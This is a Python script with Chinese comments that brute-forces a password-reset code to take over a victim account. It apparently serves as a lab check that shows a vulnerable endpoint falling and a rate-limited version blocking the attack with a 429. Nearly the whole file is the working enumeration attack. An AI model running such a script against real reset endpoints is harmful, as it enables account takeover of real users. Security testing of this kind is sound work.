"""暴力破解攻擊腳本:枚舉密碼重置驗證碼,嘗試接管受害者帳號。

同一支腳本打 vulnerable 與 secure 兩版,靠結果差異證明漏洞是否成立:
- vulnerable:無次數限制 → 枚舉到正確碼 → 重設密碼成功 → 帳號接管。
- secure:達失敗上限被 429 鎖定 → 猜中前就被擋 → 攻擊失敗。
"""

import requests

from auth_db import CODE_SPACE, CODE_WIDTH

VICTIM_EMAIL = "victim@herohospital.com"
ATTACKER_NEW_PASSWORD = "attacker-owned"
REQUEST_TIMEOUT_SECONDS = 5


def run_bruteforce_attack(base_url):
    """回傳 (是否接管成功, 說明字串)。是否接管成功=True 代表漏洞成立。"""
    # 先觸發一次密碼重置,讓伺服器產生一組我們要猜的驗證碼。
    started = requests.post(
        f"{base_url}/api/reset/request",
        json={"email": VICTIM_EMAIL},
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if started.status_code != 200:
        return False, f"無法啟動重置流程(status={started.status_code}),環境異常"

    # 枚舉整個驗證碼空間。
    for guess in range(CODE_SPACE):
        code = str(guess).zfill(CODE_WIDTH)
        resp = requests.post(
            f"{base_url}/api/reset/verify",
            json={"email": VICTIM_EMAIL, "code": code, "new_password": ATTACKER_NEW_PASSWORD},
            timeout=REQUEST_TIMEOUT_SECONDS,
        )
        if resp.status_code == 200:
            return True, f"帳號接管!第 {guess + 1} 次猜中驗證碼 {code},密碼已被改成攻擊者的"
        if resp.status_code == 429:
            return False, f"第 {guess + 1} 次嘗試即被鎖定(429),暴力破解被擋下"

    return False, "枚舉完畢仍未猜中(理論上不該發生)"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5011"
    taken_over, message = run_bruteforce_attack(target)
    print(("[漏洞成立] " if taken_over else "[已防禦] ") + message)
